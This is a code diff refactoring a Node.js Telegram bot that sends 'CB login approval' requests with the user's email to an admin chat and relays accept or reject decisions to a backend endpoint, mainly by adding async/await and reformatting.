@@ -16,7 +16,8 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 // -----------------
 // CB Login approval
 // -----------------
-export function sendLoginTelegram(email) {
+export async function sendLoginTelegram(email) {
+  const message = `*CB login approval*\n*Email:* ${email}`;
   const options = {
     parse_mode: "Markdown",
     reply_markup: {
@@ -28,11 +29,8 @@ export function sendLoginTelegram(email) {
       ]
     }
   };
-
-  const message = `*CB login approval*\n*Email:* ${email}`;
-  bot.sendMessage(ADMIN_CHAT_ID, message, options);
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
-
 
 // -----------------
 // Handle button clicks
@@ -42,7 +40,7 @@ bot.on("callback_query", async (query) => {
     const [action, email] = query.data.split("|");
     const status = action === "accept" ? "accepted" : "rejected";
 
-    // Notify backend
+    // Update backend
     await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -52,15 +50,18 @@ bot.on("callback_query", async (query) => {
     await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
 
     // Update message in Telegram
-    await bot.editMessageText(`*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`, {
-      chat_id: query.message.chat.id,
-      message_id: query.message.message_id,
-      parse_mode: "Markdown"
-    });
+    await bot.editMessageText(
+      `*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`,
+      {
+        chat_id: query.message.chat.id,
+        message_id: query.message.message_id,
+        parse_mode: "Markdown"
+      }
+    );
 
   } catch (err) {
     console.error("❌ Failed to handle callback:", err);
-    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
+    await bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
   }
 });
 
@@ -68,4 +69,3 @@ bot.on("callback_query", async (query) => {
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
 });
-
